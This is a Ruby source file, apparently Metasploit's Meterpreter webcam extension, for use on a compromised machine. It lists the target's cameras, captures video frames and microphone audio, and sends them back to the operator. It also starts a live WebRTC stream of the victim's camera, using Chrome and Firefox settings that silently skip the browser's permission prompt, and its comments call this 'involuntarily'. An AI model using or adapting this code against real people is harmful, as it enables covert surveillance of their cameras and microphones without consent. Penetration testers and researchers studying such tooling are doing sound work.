# -*- coding: binary -*-

module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Webcam

###
#
# This meterpreter extension can list and capture from webcams and/or microphone
#
###
class Webcam
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::WebRTC

  def initialize(client)
    @client = client
  end

  def session
    @client
  end

  def webcam_list
    response = client.send_request(Packet.create_request('webcam_list'))
    names = []
    response.get_tlvs(TLV_TYPE_WEBCAM_NAME).each do |tlv|
      names << tlv.value
    end
    names
  end

  # Starts recording video from video source of index +cam+
  def webcam_start(cam)
    request = Packet.create_request('webcam_start')
    request.add_tlv(TLV_TYPE_WEBCAM_INTERFACE_ID, cam)
    client.send_request(request)
    true
  end

  def webcam_get_frame(quality)
    request = Packet.create_request('webcam_get_frame')
    request.add_tlv(TLV_TYPE_WEBCAM_QUALITY, quality)
    response = client.send_request(request)
    response.get_tlv(TLV_TYPE_WEBCAM_IMAGE).value
  end

  def webcam_stop
    client.send_request(Packet.create_request('webcam_stop'))
    true
  end

  #
  # Starts a webcam session with a remote user via WebRTC
  #
  # @param server [String] A server to use for the channel.
  # @return void
  #
  def webcam_chat(server)
    offerer_id = Rex::Text.rand_text_alphanumeric(10)
    channel    = Rex::Text.rand_text_alphanumeric(20)

    remote_browser_path = webrtc_browser_path

    if remote_browser_path.to_s.strip.empty?
      fail "Unable to find a suitable browser on the target machine"
    end

    init_video_chat(remote_browser_path, server, channel, offerer_id)
    connect_video_chat(server, channel, offerer_id)
  end

  # Record from default audio source for +duration+ seconds;
  # returns a low-quality wav file
  def record_mic(duration)
    request = Packet.create_request('webcam_audio_record')
    request.add_tlv(TLV_TYPE_AUDIO_DURATION, duration)
    response = client.send_request(request)
    response.get_tlv(TLV_TYPE_AUDIO_DATA).value
  end

  attr_accessor :client

  private

  #
  # Returns a browser path that supports WebRTC
  #
  # @return [String]
  #
  def webrtc_browser_path
    found_browser_path = ''

    case client.platform
    when /win/
      paths = [
        "%ProgramFiles(x86)%\\Google\\Chrome\\Application\\chrome.exe",
        "%ProgramFiles%\\Google\\Chrome\\Application\\chrome.exe",
        "%ProgramW6432%\\Google\\Chrome\\Application\\chrome.exe",
        "%ProgramFiles(x86)%\\Mozilla Firefox\\firefox.exe",
        "%ProgramFiles%\\Mozilla Firefox\\firefox.exe",
        "%ProgramW6432%\\Mozilla Firefox\\firefox.exe"
      ]

      # Old chrome path
      user_profile = client.sys.config.getenv("USERPROFILE")
      paths << "#{user_profile}\\Local Settings\\Application Data\\Google\\Chrome\\Application\\chrome.exe"

      paths.each do |browser_path|
        if file?(browser_path)
          found_browser_path = browser_path
          break
        end
      end

    when /osx|bsd/
      [
        '/Applications/Google Chrome.app',
        '/Applications/Firefox.app'
      ].each do |browser_path|
        if file?(browser_path)
          found_browser_path = browser_path
          break
        end
      end
    when /linux|unix/
      # Need to add support for Linux in the future.
      # But you see, the Linux meterpreter is so broken there is no point
      # to do it now. You can't test anyway.
    end

    found_browser_path
  end

  #
  # Creates a video chat session as an offerer... involuntarily :-p
  # Windows targets only.
  #
  # @param remote_browser_path [String] A browser path that supports WebRTC on the target machine
  # @param offerer_id [String] A ID that the answerer can look for and join
  #
  def init_video_chat(remote_browser_path, server, channel, offerer_id)
    interface = load_interface('offerer.html')
    api       = load_api_code

    interface = interface.gsub(/\=SERVER\=/, server)
    interface = interface.gsub(/\=CHANNEL\=/, channel)
    interface = interface.gsub(/\=OFFERERID\=/, offerer_id)

    tmp_dir = session.sys.config.getenv("TEMP")

    begin
      write_file("#{tmp_dir}\\interface.html", interface)
      write_file("#{tmp_dir}\\api.js", api)
    rescue RuntimeError => e
      elog("webcam_chat failed. #{e.class} #{e}")
      raise "Unable to initialize the interface on the target machine"
    end

    #
    # Automatically allow the webcam to run on the target machine
    #
    args = ''
    if remote_browser_path =~ /Chrome/
      args = "--allow-file-access-from-files --use-fake-ui-for-media-stream"
    elsif remote_browser_path =~ /Firefox/
      profile_name = Rex::Text.rand_text_alpha(8)
      o = cmd_exec("#{remote_browser_path} --CreateProfile #{profile_name} #{tmp_dir}\\#{profile_name}")
      profile_path = (o.scan(/created profile '.+' at '(.+)'/).flatten[0] || '').strip
      setting = %|user_pref("media.navigator.permission.disabled", true);|
      begin
        write_file(profile_path, setting)
      rescue RuntimeError => e
        elog("webcam_chat failed: #{e.class} #{e}")
        raise "Unable to write the necessary setting for Firefox."
      end
      args = "-p #{profile_name}"
    end

    exec_opts = { 'Hidden' => false, 'Channelized' => false }

    begin
      session.sys.process.execute(remote_browser_path, "#{args} #{tmp_dir}\\interface.html", exec_opts)
    rescue RuntimeError => e
      elog("webcam_chat failed. #{e.class} #{e}")
      raise "Unable to start the remote browser: #{e.message}"
    end
  end
end
end
end
end
end
end
end
